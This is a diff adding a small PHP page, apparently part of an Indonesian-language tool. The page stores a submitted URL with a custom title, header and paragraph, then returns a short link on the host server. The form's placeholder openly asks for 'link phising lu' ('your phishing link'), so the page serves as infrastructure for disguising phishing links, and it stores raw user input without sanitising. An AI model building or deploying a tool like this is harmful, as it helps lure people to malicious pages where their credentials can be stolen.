@@ -1,0 +1,55 @@
+<?php
+$url = null;
+include "tools.html";
+$id = bin2hex(random_bytes(4));
+
+if($_POST){
+	$title = $_POST['title'];
+	$header = $_POST['header'];
+	$paragraf = $_POST['paragraf'];
+	$url = $_POST['url'];
+	
+	if($url != null)
+	{
+		$data = $url."|".$header."|".$paragraf."|".$title;
+	$db = "db/";
+	$bikin = file_put_contents($db.$id.".txt", $data);
+	if( $bikin ){
+		$website = 'https://'.$_SERVER['SERVER_NAME'].'/?id=';
+		$short_link = $website.$id;
+		$response = $short_link;
+		redirect($response);
+	}else{
+	
+	}
+}else{
+		
+		alert('url harus di isi dek');
+		exit();
+		}
+	//edirect($response);
+}else{
+?>
+	
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Create Dek</title>
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div class="login">
+<form method="POST" action="" autocomplete="off">
+<input type="url" autofocus name="url" placeholder="link phising lu" required="required" />
+<button type="submit" class="btn btn-primary btn-block btn-large">Create</button>
+</form>
+</div>
+</body>
+</html>
+<?php
+}
+	
+?>
